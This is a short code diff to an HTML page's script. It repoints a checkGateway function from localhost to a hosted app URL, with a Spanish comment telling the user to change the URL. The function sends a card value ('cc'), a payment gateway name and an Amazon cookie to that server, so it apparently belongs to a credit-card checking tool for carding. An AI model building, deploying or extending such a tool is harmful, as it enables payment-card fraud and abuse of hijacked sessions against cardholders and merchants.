@@ -134,7 +134,7 @@
 
     async function checkGateway(cc, gateway) {
         try {
-            const response = await fetch('http://localhost:5000/check', {
+            const response = await fetch('https://tu-app.up.railway.app/check', {  // <- Cambia esta URL
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ cc: cc, gateway: gateway, cookie: amazonCookie })
@@ -150,5 +150,7 @@
     }
 </script>
 
+
 </body>
 </html>
+
